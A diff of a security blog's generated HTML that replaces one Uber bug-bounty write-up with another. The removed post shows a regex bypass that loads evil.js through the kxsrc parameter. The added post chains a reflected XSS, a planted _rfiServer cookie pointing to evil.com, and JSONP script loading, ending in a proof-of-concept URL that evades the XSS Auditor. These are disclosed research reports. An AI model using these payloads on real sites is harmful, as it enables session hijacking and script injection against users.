@@ -84,23 +84,22 @@
 
 
 
-<meta name="description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
-漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
-123456789101112131415">
+<meta name="description" content="This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
+JSONP RequestSeveral months ago,">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[BBP系列一] 人生第一个值钱的XSS漏洞">
-<meta property="og:url" content="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/index.html">
+<meta property="og:title" content="[BBP系列二] Uber XSS via Cookie">
+<meta property="og:url" content="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
-漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
-123456789101112131415">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif">
+<meta property="og:description" content="This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
+JSONP RequestSeveral months ago,">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[BBP系列一] 人生第一个值钱的XSS漏洞">
-<meta name="twitter:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
-漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
-123456789101112131415">
+<meta name="twitter:title" content="[BBP系列二] Uber XSS via Cookie">
+<meta name="twitter:description" content="This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
+JSONP RequestSeveral months ago,">
 
 
 
@@ -122,9 +121,9 @@
 
 
 
-  <link rel="canonical" href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/"/>
+  <link rel="canonical" href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/"/>
 
-  <title> [BBP系列一] 人生第一个值钱的XSS漏洞 | zhchbin </title>
+  <title> [BBP系列二] Uber XSS via Cookie | zhchbin </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -264,7 +263,7 @@
             
             
               
-                [BBP系列一] 人生第一个值钱的XSS漏洞
+                [BBP系列二] Uber XSS via Cookie
               
             
           </h1>
@@ -276,8 +275,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-10T20:40:17+08:00" content="2016-09-10">
-              2016-09-10
+            <time itemprop="dateCreated" datetime="2017-08-30T19:36:20+08:00" content="2017-08-30">
+              2017-08-30
             </time>
           </span>
 
@@ -287,8 +286,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/09/10/A-Valuable-XSS/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/09/10/A-Valuable-XSS/" itemprop="commentsCount"></span>
+                <a href="/2017/08/30/Uber-XSS-via-Cookie/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/30/Uber-XSS-via-Cookie/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -316,16 +315,37 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。</p>
-<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>在看Uber的网站前端JS代码的时候，发现有如下的一段代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  <span class="comment">// 创建script标签</span></span><br><span class="line">    k.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    k.async = <span class="literal">true</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-id"</span>, u.pubid);</span><br><span class="line">    k.className = <span class="string">"kxct"</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-version"</span>, <span class="string">"1.9"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从location.href参数中读取kxsrc</span></span><br><span class="line">    <span class="keyword">var</span> m, src = (m = location.href.match(<span class="regexp">/\bkxsrc=([^&amp;]+)/</span>)) &amp;&amp; <span class="built_in">decodeURIComponent</span>(m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 </span></span><br><span class="line">    k.src = <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(src) ? src : src === <span class="string">"disable"</span> ? <span class="string">""</span> : (location.protocol === <span class="string">"https:"</span> ? <span class="string">"https:"</span> : <span class="string">"http:"</span>) + <span class="string">"//cdn.krxd.net/controltag?confid="</span> + u.pubid;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(k, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<p>目前代码还能在：<a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js" target="_blank" rel="external">https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js</a> 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是<code>kxsrc</code>是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>咋一看，这段代码似乎没有什么问题：JS文件只能是<code>krxd.net</code>域下的文件。然而，在正则表达式里：<code>.</code>代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.bkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ckrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.dkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ekrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.fkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://aafkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://abfkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p>
-<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//www</span>.uber.com/?<span class="keyword">exp</span>=hp-c&amp;kxsrc=https<span class="variable">%3A</span><span class="variable">%2F</span><span class="variable">%2Fwww</span>.akrxd.net<span class="variable">%2Fcontroltag</span><span class="variable">%2Fevil</span>.js</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p>
-<p>思考题: 写这段正则判断代码的人应该还希望限制路径，但其实很容易就可以被绕过，怎么绕呢？</p>
+        <p>This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>
+<h2 id="JSONP-Request"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</h2><p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="keyword">this</span>.log(<span class="string">"making idr call"</span>),</span><br><span class="line">    a = <span class="keyword">this</span>.rfiServer ? <span class="keyword">this</span>.rfiServer : <span class="string">"a.rfihub.com"</span>,</span><br><span class="line">    b = <span class="keyword">this</span>.getProtocol() + <span class="string">"//"</span> + a + <span class="string">"/idr.js"</span>,</span><br><span class="line">    <span class="keyword">this</span>.jsonpGet(b, &#123;&#125;, <span class="keyword">this</span>.idrCallback, <span class="string">"cmZpSWRJbkNhY2hl"</span>),</span><br><span class="line">    <span class="keyword">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg" alt=""></p>
+<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="external">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg" alt=""></p>
+<p>After reading through these lines of code:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">this</span>.readCookie(<span class="string">"_rfiServer"</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="keyword">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure>
+<p>We could get the information that the initial value of <code>this.rfiServer</code> was set by using value of cookie <code>_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>
+<ul>
+<li>HTTP Header CRLF Injection at any subdomain of uber.com</li>
+<li>XSS at any subdomain of uber.com</li>
+</ul>
+<p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
+<h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="class">.cookie</span> = <span class="string">'_rfiServer=eviljs.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p>
+<h2 id="XSS-of-uber-com-but-Out-of-Scope"><a href="#XSS-of-uber-com-but-Out-of-Scope" class="headerlink" title="XSS of uber.com but Out of Scope"></a>XSS of uber.com but Out of Scope</h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p>
+<ol>
+<li><code>&quot;</code> is reflected and not encoded. We can inject any attribution into <code>input</code> tag.</li>
+<li><code>type=&quot;text&quot;</code> is after the injection point. So we can inject <code>type=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;</code>. Note that when there is two types, the second one will be ignored.</li>
+<li><code>&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code>o&gt;nerror</code>.</li>
+</ol>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
+<li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li>
+<li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li>
+<li><p>The final PoC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span><br><span class="line">email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 
       
     </div>
@@ -361,17 +381,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/09/01/Baidu-Browser-RCE/" rel="next" title="[浏览器安全系列二] 百度浏览器远程命令执行">
-                <i class="fa fa-chevron-left"></i> [浏览器安全系列二] 百度浏览器远程命令执行
+              <a href="/2016/12/25/DOM-XSS-Caused-by-AddThis/" rel="next" title="分享插件AddThis导致的DOM XSS">
+                <i class="fa fa-chevron-left"></i> 分享插件AddThis导致的DOM XSS
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/10/06/Sogou-Browser-RCE/" rel="prev" title="[浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行">
-                [浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -551,7 +567,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码"><span class="nav-number">2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PoC"><span class="nav-number">4.</span> <span class="nav-text">PoC</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP-Request"><span class="nav-number">1.</span> <span class="nav-text">JSONP Request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Feature-of-Cookie"><span class="nav-number">2.</span> <span class="nav-text">The Feature of Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-of-uber-com-but-Out-of-Scope"><span class="nav-number">3.</span> <span class="nav-text">XSS of uber.com but Out of Scope</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">4.</span> <span class="nav-text">Summary</span></a></li></ol></div>
             
           </div>
         </section>
@@ -709,9 +725,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = 'zhchbin';
-      var disqus_identifier = '2016/09/10/A-Valuable-XSS/';
-      var disqus_title = "[BBP系列一] 人生第一个值钱的XSS漏洞";
-      var disqus_url = 'http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/';
+      var disqus_identifier = '2017/08/30/Uber-XSS-via-Cookie/';
+      var disqus_title = "[BBP系列二] Uber XSS via Cookie";
+      var disqus_url = 'http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
